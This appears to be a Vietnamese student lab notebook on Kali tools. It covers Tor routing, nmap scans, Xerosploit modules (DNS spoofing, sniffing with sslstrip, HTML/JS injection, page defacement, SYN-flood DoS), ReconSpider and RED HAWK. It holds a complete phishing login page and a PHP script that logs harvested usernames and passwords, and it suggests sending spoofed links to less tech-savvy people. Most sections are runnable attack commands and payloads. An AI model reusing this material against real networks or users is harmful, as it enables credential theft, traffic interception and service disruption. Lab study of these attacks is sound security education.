# HACKING TOOL

## ANONYMOUSLY HIDING 

### Mô tả 
Anonnymously Hiding có chức năng là chuyển phần lớn lưu lượng mạng của hệ điều hành Kali linux qua mạng Tor.
Khi được kích hoạt, công cụ sẽ được thực hiện các tác vụ sau:
 + Khởi động dịch vụ Tor
 + Thay đổi địa chỉ IP công khai sang địa chỉ IP cỉa một Tor Exit Node
 + Thay đổi DNS để tránh rò rỉ DNS

### Cơ chế hoạt động
- Khi chưa sử dụng Anonsurf: 
 + website có thể nhìn thấy địa chỉ IP công khai thật của người dùng
- Khi sử dụng Anonsurf:
 + website chỉ nhìn thấy địa chỉ IP của Tor Exit Node thay vì địa chỉ IP công khai ban đầu

### Tor (The Onion Router)
Là 1 trình duyệt và mạng ẩn danh giúp người dùng truy cập Internet 1 cách riêng tư và bảo mật, đồng thời che giấu địa chỉ IP và dữ liệu truy cập. Khiến cho việc xác định danh tính người dùng trở nên khó khăn.
**Mục đích sử dụng**
- Ẩn danh tuyệt đối
- Truy cập nội dung bị kiểm duyệt
- Truy cập deep web và dark web
- Bảo vệ thông tin nhạy cảm

**Ưu điểm**
 - Bảo vệ quyền riêng tư và ẩn danh
 - Truy cập trang web bị chặn và có giới hạn
**Nhược điểm**
 - Tốc độ truy cập cực kì chậm
 - 1 vài trang web hạn chế hoặc cấm luôn Tor

 ### Thực hành

**Trước khi bật Anonymously Hiding**
![Trước khi bật](image.png)
![Không truy cập được Tor](image-1.png)
![Lộ địa chỉ IP](image-2.png)
**Sau khi bật Anonymously Hiding**
![Có thể vào Tor website](image-3.png)

- Lúc này bạn tải browser về để thử 

- Lúc này không khác gì giao diện web bình thường, nhưng kết nối có thể chậm hơn do việc chuyển hướng IP network và giấu DNS. Lúc đó mọi thứ đều ẩn danh nhưng không phải hoàn toàn. Và nếu muốn vào Tor thì phải bật Anonymously surf

## Information gathering

### Sử dụng nmap check thông tin máy 
**Quét nhanh**
nmap IP_ADDRESS
**Quét dịch vụ**
sudo nmap -sS -sV -Pn IP_ADDRESS
- -sS (TCP SYN Scan/Stealth Scan)
- -sV (Version detection)
- -Pn (No Ping)
**Nhận diện OS**
sudo nmap -O -Pn IP_ADDRESS
- -O (Operating System detection)
**Quét cổng (ví dụ: 8000):**
- sudo nmap -sS -sV -Pn -p 8000 --reason IP_ADDRESS

### Xerosploit
**Lưu ý quan trọng**
- Vì xerosploit bên trong hacking tool là bản cũ, chúng ta cần tự tải:   
```bash
sudo apt install -y nmap hping3 build-essential ruby ruby-dev libpcap-dev libgmp3-dev libgmp-dev python3-pip git
```

Tải mã nguồn:
```bash
cd /opt

sudo git clone https://github.com/lzskyline/xeroploit3.git

cd xeroploit3

sudo python3 -m pip install -r requirements.txt --break-system-packages


sudo python3 install.py
```

Khởi động mã nguồn
```bash
cd /opt/xerosploit3 && sudo python3 xerosploit.py
```

Khi vào trong đây, hãy chọn scan để có thể quét toàn bộ các máy đang nằm cùng dải mạng. **Lưu ý máy tấn công cũng phải cùng chung dải mạng**. Sau đó chọn IP đối phương để target

![Menu xeroploit](Screenshot_2026-07-15_07_21_22.png)
 
- Ở đây sẽ có Ping (kiểm tra xem máy đối phương có chặn ping không) và Port scan (Kiểm tra các Port máy target đang mở), từ đó bắt đầu thực hiện các tác vụ khác.

#### dspoof
- Menu dspoof: trả về 1 địa chỉ IP giả cho truy vấn tên miền, khiến người dùng được chuyển tới server khác

Thông thường:

```text
Máy Windows truy vấn tên miền
        ↓
DNS Server trả về IP thật
        ↓
Trình duyệt truy cập máy chủ thật
```

Khi DNS Spoofing hoạt động:

```text
Máy Windows truy vấn cau2.4
        ↓
Xerosploit trả về IP giả 192.168.0.229
        ↓
Trình duyệt kết nối đến máy Kali
        ↓
Apache hiển thị trang web thử nghiệm
```

Thử nghiệm:
chạy với đường dẫn này 
cd /opt/xerosploit3

sudo env \
PATH=/usr/local/bin:/usr/bin:/bin \
python3 xerosploit.py


- Để thử nghiệm Lab này, dựng 1 trang web chuyển hướng 

```bash
sudo nano /var/www/html/index.html

<!DOCTYPE html>

<html lang="vi">

<head>

    <meta charset="UTF-8">

    <title>TrangWebChuyenHuong</title>

</head>

<body>

    <h1>DNS Spoofing thanh cong</h1>

    <p>TRINH DUYET WEB CUA BAN DA DUOC DI CHUYEN TOI MAY CHU KALI NAY ROI HEHE</p>

</body>

</html>
```
- Khởi động Apache 

- Khởi động Xerosploit, tại menu chính nhập:
```text
start

IP máy tấn công

dspoof

run 

Nhập IP address where you want to redirect the traffic là IP của máy tấn công
```

lúc này chỉ cần gửi địa chỉ tấn công cho người yếu công nghệ hoặc không rành lắm về http hay https, với địa chỉ ví dụ http://dlu.edu.vn, tất cả sẽ redict thẳng về máy của mình

**Vậy nếu tạo 1 trang web giả mạo và thu thập tài khoản mật khẩu của người khác thì sao?**
- Khi chỉ có html, chỉ có thể làm các chức năng như 
 + Hiển thị trang web
 + Gửi 1 biểu mẫu tới 1 địa chỉ để xử lý

- Nhưng HTML không biết cách:
 + Đọc dữ liệu POST.
 + Kiểm tra IP máy gửi.
 + Ghi dữ liệu vào file log.
 + Trả trang thông báo kết quả.

- Vì vậy, recive.php sẽ nhận dữ liệu bằng:
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

Sau đó ghi dữ liệu vào ancapthongtin.log
```bash
file_put_contents(
    '/var/log/ancapthongtin.log',
    $logLine,
    FILE_APPEND | LOCK_EX
);
```

Tạo lại file:

```bash
sudo nano /var/www/html/index.html
```

```bash
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Spoofing Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #eef2f7;
            margin: 0;
        }
        .container {
            width: 90%;
            max-width: 430px;
            margin: 70px auto;
            padding: 30px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
        }
        input, button {
            width: 100%;
            box-sizing: border-box;
            margin-top: 10px;
            margin-bottom: 15px; /* Thêm khoảng cách cho thoáng */
            padding: 12px;
            border-radius: 6px;  /* Bo góc nhẹ cho hiện đại */
            border: 1px solid #ccc;
        }
        button {
            background: #2563eb;
            color: white;
            border: 0;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #1d4ed8;
        }
    </style>
</head>
<body>
    <main class="container">
        <h1>DNS Spoofing Lab</h1>
        <form action="/receive.php" method="post">
            <label App for="username">Username</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password</label>
            <!-- ĐÃ SỬA: Thay type="text" thành "password" để ẩn ký tự và thêm name="password" -->
            <input type="password" id="password" name="password" required>

            <button type="submit">Đăng nhập tài khoản</button>
        </form>
    </main>
</body>
</html>
```
Tạo File:
```bash
sudo nano /var/www/html/recive.php
```

```bash
<?php
declare(strict_types=1);

const LOG_FILE = '/var/log/xero-lab.log';
$clientIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Nhận cả username và password từ POST hoặc GET, chấp nhận mọi ký tự
$username = (string) ($_POST['username'] ?? $_GET['username'] ?? 'empty_user');
$password = (string) ($_POST['password'] ?? $_GET['password'] ?? 'empty_password');

// Ghi cả tài khoản và mật khẩu vào log để kiểm tra kết quả bài lab
$logLine = sprintf(
    "[%s] client=%s user=%s pass=%s%s",
    date('Y-m-d H:i:s'),
    $clientIp,
    $username,
    $password,
    PHP_EOL
);

file_put_contents(LOG_FILE, $logLine, FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Hoàn thành</title>
</head>
<body>
    <h1>Đăng nhập thành công</h1>
    <p>Hệ thống đang chuyển hướng, vui lòng đợi...</p>
</body>
</html>
```
Tạo file log trên Kali

Tạo file:

```bash
sudo install \
-o www-data \
-g adm \
-m 0640 \
/dev/null \
/var/log/ancapthongtin.log
```
- Sau đó khởi động lại apache2

Kiểm tra trên Kali:

```bash
curl http://127.0.0.1
```

Kiểm tra bằng IP Kali:

```bash
curl http://192.168.0.229
```

Trên Windows:

```powershell
ping 192.168.0.228
```

Sau đó:

```powershell
curl.exe http://192.168.0.228
```

Hoặc mở trình duyệt:

```text
http://192.168.0.228
```

Nếu trang web hiển thị, Apache và PHP đã sẵn sàng.

---

Chạy module `dspoof`

Trong menu chính Xerosploit, nhập:

```text
start
```

Khi được yêu cầu nhập mục tiêu, nhập IP Windows client:

```text
192.168.0.176
```

> Đây phải là IP của máy mục tiêu Windows, không phải IP Kali.

Tại menu module, nhập:

```text
dspoof
```

Tiếp tục:

```text
run
```

Khi chương trình hỏi:

```text
Enter the IP address where you want to redirect the traffic
```

nhập IP máy Kali:

```text
192.168.0.228
```

Trình tự đầy đủ:

```text
Xero ➮ start

Target ➮ 192.168.0.176

Xero»modules ➮ dspoof

Xero»modules»dspoof ➮ run

Xero»modules»dspoof ➮ 192.168.0.228
```

Kết quả mong đợi:

```text
Redirecting all the traffic to 192.168.0.228
Press Ctrl + C to stop
```

![kết quả thu thập thông tin](hinhanh/ketqua.png)
![spoofdlu](hinhanh/spoofdlu.png)
![dangnhaplaythongtin](hinhanh/dangnhaplaythongtin.png)

#### sniff

Module sniff trong Xerosploit được sử dụng để bắt và phân tích
lưu lượng mạng của máy mục tiêu trong mạng LAN.

Trong bài lab, Xerosploit sử dụng xettercap để đưa máy Kali vào
luồng liên lạc giữa Windows client và gateway.

- Trước tiên, tải xterm
```bash
sudo apt update
sudo apt install -y xterm
```

Chạy Xerosploit để root có thể mở cửa sổ

Cho phép root truy cập tạm thời vào màn hình desktop:

```bash
xhost +SI:localuser:root

cd /opt/xerosploit3

sudo -E env \
DISPLAY="$DISPLAY" \
XAUTHORITY="$XAUTHORITY" \
PATH=/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
python3 xerosploit.py
```

Khi module `sniff` hoạt động, Xerosploit sử dụng `xettercap` để:

- Đặt Kali vào giữa Windows và gateway.
- Quan sát lưu lượng của máy Windows.
- Ghi kết quả vào file log.
- Lưu các gói tin vào file PCAP.

##### Chuẩn bị trang HTTP thử nghiệm 

Module `sniff` cần có lưu lượng mạng để quan sát. Trong bài lab này, một file văn bản được tạo trên Apache của Kali.

Khởi động Apache:

```bash
sudo systemctl enable --now apache2
```

Tạo file thử nghiệm:

```bash
echo "DAY LA DU LIEU HTTP THU NGHIEM CUA XEROSPLOIT" |
sudo tee /var/www/html/sniff-test.txt
```
Trên windows:

Truy cập file:
```powershell
curl.exe -v http://192.168.0.228/sniff-test.txt
```

Trong giao diện Xerosploit nhập:

Trình tự:

```text
Xero ➮ start

Target ➮ 192.168.0.167

Xero»modules ➮ sniff

Xero»modules»sniff ➮ run

Do you want to load sslstrip? ➮ y
```

Về lại windows và chạy:
```powershell
1..3 | ForEach-Object {
    curl.exe http://192.168.0.228/sniff-test.txt
}
```

##### Quan sát bằng cửa sổ `xterm`

Trên Windows tạo lưu lượng HTTP:

```powershell
1..3 | ForEach-Object {
    curl.exe http://192.168.0.228/sniff-test.txt
}
```

Xerosploit lưu kết quả trong:

```text
/opt/xerosploit/xerosniff/
```

Kiểm tra:

```bash
sudo ls -lh /opt/xerosploit/xerosniff/
```

#### Yplay

Module `yplay` dùng Xettercap để chèn video YouTube vào trang web HTTP mà máy Windows truy cập.

##### Sửa video hiển thị rõ

Mở source:

```bash
sudo nano /opt/xerosploit3/xerosploit.py
```

Tìm dòng chứa:

```text
youtube.com/embed
```

Thay bằng:

```python
code = "<head><iframe width='640' height='360' src='https://www.youtube.com/embed/" + video_id + "?controls=1' title='Xerosploit Yplay Lab' frameborder='0' allow='autoplay; encrypted-media' allowfullscreen></iframe>"
```

Kiểm tra:

```bash
sudo python3 -m py_compile /opt/xerosploit3/xerosploit.py
```

##### Chạy Xerosploit

```bash
cd /opt/xerosploit3

sudo env \
PATH=/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
python3 xerosploit.py
```

Trong Xerosploit:

```text
start
192.168.0.176

yplay
run

8VO3zDDVeig
```

`8VO3zDDVeig` là video ID lấy từ URL:

```text
https://www.youtube.com/watch?v=8VO3zDDVeig
```

##### Kiểm tra trên Windows

Mở:

```text
http://neverssl.com
```

Sau đó:

```text
F12
→ Network
→ Disable cache
→ Ctrl + F5
```

Video sẽ xuất hiện trên trang. Bấm **Play** để nghe âm thanh.

Trong tab `Elements`, tìm:

```text
8VO3zDDVeig
```

Nếu thấy iframe YouTube thì module đã hoạt động.

#### InjectHTML
Module `injecthtml` dùng Xettercap để chèn thêm mã HTML vào phản hồi của trang web HTTP.

Tạo file HTML trên Kali:

```bash
cat > ~/Downloads/inject.html <<'EOF'
<div style="background:yellow;border:3px solid red;padding:20px;text-align:center">
  <h1>NHAM VINH THUY XEROSPLOIT3</h1>
</div>
EOF
```

Chạy module trên Xeroploit3

Trên Windows mở:

```text
http://neverssl.com
```

Sau đó tải lại bằng:

```text
Ctrl + F5
```

Lúc này sẽ thấy dòng chữ của trang HTML trên tiêu đề

#### InjectJS

Module `InjectJS` dùng Xettercap để chèn mã JavaScript vào phản hồi của trang web HTTP.  

Tạo file JavaScript trên Kali:

```bash
cat > ~/Downloads/inject.js <<'EOF'
document.body.style.border = "12px solid red";
document.body.style.backgroundColor = "#fff3cd";

const banner = document.createElement("div");
banner.innerText = "NHAM VINH THUY - INJECTJS THANH CONG";
banner.style.cssText =
  "position:fixed;top:0;left:0;width:100%;z-index:999999;" +
  "background:red;color:white;padding:18px;text-align:center;" +
  "font-size:24px;font-weight:bold;";

document.body.prepend(banner);
EOF
```

chạy module trên xeroploit3 

Trên Windows mở:

```text
http://neverssl.com
```

Sau đó tải lại bằng:

```text
Ctrl + F5
```

Giao diện trình duyệt bị thay đổi

#### Move 

Module `move` dùng Xettercap để chèn file JavaScript `shakescreen.js` vào trang HTTP, làm nội dung trên trình duyệt Windows rung hoặc dịch chuyển.

##### Sửa lỗi tương thích Ruby

```bash
INJECTJS_FILE="/var/lib/gems/3.3.0/gems/xettercap-1.5.7xerob/lib/bettercap/proxy/http/modules/injectjs.rb"

sudo sed -i \
's/File\.exists?/File.exist?/g' \
"$INJECTJS_FILE"

ruby -c "$INJECTJS_FILE"
```

Kết quả cần có:

```text
Syntax OK
```

##### Chạy Xerosploit3

```bash
cd /opt/xerosploit3

sudo env \
PATH=/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
python3 xerosploit.py
```

Trong Xerosploit:

```text
start
192.168.0.176

move
run
```

Kiểm tra tiến trình:

```bash
pgrep -a -f xettercap
```

Mở trên windows:

```text
http://neverssl.com/
```

Sau đó:

```text
F12
→ Network
→ Disable cache
→ Ctrl + F5
```

Nếu hoạt động, nội dung trang sẽ rung hoặc di chuyển liên tục.

#### deface

Module deface thay toàn bộ nội dung trang HTTP mà máy Windows nhận được bằng một file HTML do bạn chuẩn bị. Nó không sửa website gốc trên server, chỉ sửa phản hồi khi lưu lượng đi qua Kali.

##### Tạo file HTML

```bash
cat > ~/Downloads/deface.html <<'EOF'
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Xerosploit3 Deface </title>
    <style>
        body {
            background: #111;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
            padding-top: 150px;
        }
    </style>
</head>
<body>
    <h1>NHAM VINH THUY - XEROSPLOIT3</h1>
    <p>DEFACE THÀNH CÔNG</p>
</body>
</html>
EOF
```

##### Chạy module

```text
start
192.168.0.176

deface
run
/home/kali/Downloads/deface.html
```

Trên Windows mở:

```text
http://neverssl.com/
```

Sau đó tải lại:

```text
Ctrl + F5
```

**SỬA LỖI DEFACE**

TẠO SCRIPT VÁ

```BASH
cat > /tmp/fix_deface_v2.py <<'PY'
from pathlib import Path
import shutil
import sys

path = Path("/opt/xerosploit3/xerosploit.py")
backup = Path("/opt/xerosploit3/xerosploit.py.bak-deface-v2")

text = path.read_text(encoding="utf-8")
lines = text.splitlines(keepends=True)

start_marker = 'file_deface = file_deface.replace("\'","")'
end_marker = 'cmd_inject = os.system("xettercap "'

start = None
end = None

for index, line in enumerate(lines):
    if start_marker in line:
        start = index
        break

if start is None:
    sys.exit("[LOI] Không tìm thấy dòng bắt đầu của đoạn deface.")

for index in range(start, len(lines)):
    if end_marker in lines[index]:
        end = index
        break

if end is None:
    sys.exit("[LOI] Không tìm thấy dòng cmd_inject của đoạn deface.")

# Lấy đúng độ thụt lề từ dòng cũ
indent = lines[start][:len(lines[start]) - len(lines[start].lstrip())]
inner = indent + "        "

new_block = [
    f"{indent}import json\n",
    "\n",
    f'{indent}file_path = file_deface.replace("\'", "").strip()\n',
    "\n",
    f'{indent}with open(file_path, "r", encoding="utf-8") as html_file:\n',
    f"{inner}html_content = html_file.read()\n",
    "\n",
    f'{indent}print("\\033[1;34m\\n[++] Overwriting all web pages ... \\033[1;m")\n',
    f'{indent}print("\\033[1;34m\\n[++] Press \'Ctrl + C\' to stop . \\n\\033[1;m")\n',
    "\n",
    f"{indent}content = (\n",
    f'{inner}"<script type=\'text/javascript\'>"\n',
    f'{inner}"window.addEventListener(\'load\', function(){{"\n',
    f'{inner}"document.body.innerHTML = "\n',
    f"{inner}+ json.dumps(html_content)\n",
    f'{inner}+ ";"\n',
    f'{inner}+"}});"\n',
    f'{inner}+"</script>"\n',
    f"{indent})\n",
    "\n",
    f'{indent}temp_file = "/tmp/xero-html.html"\n',
    "\n",
    f'{indent}with open(temp_file, "w", encoding="utf-8") as output_file:\n',
    f"{inner}output_file.write(content)\n",
    "\n",
    f"{indent}cmd_inject = os.system(\n",
    f'{inner}"xettercap "\n',
    f"{inner}+ target_parse\n",
    f"{inner}+ target_ips\n",
    f'{inner}+ " --proxy-module=./tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb"\n',
    f'{inner}+ " --js-file "\n',
    f"{inner}+ temp_file\n",
    f'{inner}+ " -I "\n',
    f"{inner}+ up_interface\n",
    f'{inner}+ " --gateway "\n',
    f"{inner}+ gateway\n",
    f"{indent})\n",
]

if not backup.exists():
    shutil.copy2(path, backup)
    print(f"[OK] Đã sao lưu: {backup}")
else:
    print(f"[INFO] Backup đã tồn tại: {backup}")

updated = lines[:start] + new_block + lines[end + 1:]
path.write_text("".join(updated), encoding="utf-8")

print(f"[OK] Đã thay dòng {start + 1} đến {end + 1}")
print(f"[OK] Đã sửa: {path}")
PY
```

#### DoS

Module `dos` của Xerosploit3 sử dụng `hping3` để gửi liên tục các gói TCP SYN tới máy đích, với mục tiêu làm tăng tải xử lý kết nối và gây gián đoạn dịch vụ.

```text
start
192.168.0.176

dos
run
```

Khi hoạt động, Xerosploit hiển thị:

```text
Performing a DoS attack to 192.168.0.176
hping in flood mode, no replies will be shown
```

Trên Windows kiểm tra thống kê TCP:

```powershell
netstat -s -p tcp
```
hoặc vào 
```powershell
win + R
resmon
```
Kiểm tra lưu lượng TCP gửi

Module đã tạo được lưu lượng mang đặc điểm SYN flood, nhưng chưa gây ra trạng thái từ chối dịch vụ thực tế. Không nên tăng cường độ hoặc kéo dài thời gian thử nghiệm vì có thể ảnh hưởng router và các thiết bị khác trong mạng.

### Reconspider

ReconSpider là công cụ OSINT viết bằng Python, dùng để thu thập và tổng hợp thông tin công khai liên quan đến mục tiêu.

Công cụ hỗ trợ nhiều loại đối tượng như:

- Địa chỉ IP
- Tên miền
- Số điện thoại
- Bản ghi DNS
- File và metadata
- Ảnh
- Địa chỉ MAC
- Username
- Email hoặc tên miền bị rò rỉ

ReconSpider chủ yếu phục vụ giai đoạn:

```text
Reconnaissance
→ Information Gathering
→ Phân tích bề mặt mục tiêu
```

Đây là giai đoạn đầu của quá trình kiểm thử bảo mật.

**MỤC ĐÍCH SỬ DỤNG**

- Thu thập thông tin từ nhiều nguồn
- Tiết kiệm thời gian tra cứu thủ công
- Tổng hợp dữ liệu về mục tiêu
- Phát hiện tài sản và dấu vết công khai
- Hỗ trợ đánh giá bề mặt tấn công
- Chuẩn bị dữ liệu cho các bước kiểm thử tiếp theo

ReconSpider không tự động chứng minh mục tiêu có lỗ hổng. Kết quả của công cụ cần được kiểm tra và xác minh lại.

#### Khởi động ReconSpider

```bash
cd ~/hacking-lab/hackingtool

source .venv/bin/activate

cd reconspider

unset PYTHONPATH
export PYTHONPATH="$PWD"

find . -type d -name '__pycache__' -prune -exec rm -rf {} +

python3 -c "import ipaddress; print(ipaddress.__file__)"

python3 reconspider.py
```

Sau này chỉ cần khởi động:
```bash
cd ~/hacking-lab/hackingtool
source .venv/bin/activate

cd reconspider
export PYTHONPATH="$PWD"

python3 reconspider.py
```

#### IP 

Module `IP` dùng để thu thập thông tin công khai liên quan đến một địa chỉ IP public.

Thông tin có thể gồm:

- Địa chỉ IP
- Quốc gia
- Mã quốc gia
- Khu vực
- Thành phố
- Tọa độ gần đúng
- Múi giờ
- ASN
- ISP hoặc tổ chức quản lý

![IP](hinhanh/IP.png)

#### Domain


### RED HAWK

RED HAWK là công cụ thu thập thông tin website được viết bằng PHP. Công cụ hỗ trợ kiểm thử bảo mật.

#### Chức năng chính

RED HAWK có thể thu thập:

```text
Địa chỉ IP của website
Thông tin DNS
Thông tin Whois
Web server đang sử dụng
CMS của website
Subdomain
robots.txt
Banner dịch vụ
Các cổng đang mở
```

Ngoài ra, công cụ còn hỗ trợ:

```text
Basic Scan
DNS Lookup
Whois Lookup
Subdomain Scanner
Nmap Port Scan
Crawler
Scan For Everything
```

#### Cơ chế hoạt động

```text
Nhập tên miền
      ↓
RED HAWK gửi truy vấn DNS và HTTP
      ↓
Thu thập thông tin công khai
      ↓
Phân tích server, CMS, subdomain và cổng
      ↓
Hiển thị kết quả cho người kiểm thử
```

#### Ý nghĩa

RED HAWK giúp người kiểm thử:

- Xác định hạ tầng của website.
- Tìm các dịch vụ đang được công khai.
- Phát hiện công nghệ và CMS đang sử dụng.
- Xác định các subdomain có thể cần kiểm tra thêm.
- Chuẩn bị dữ liệu cho các bước kiểm thử tiếp theo.

![Red hawk](hinhanh/QuetWebsite.png)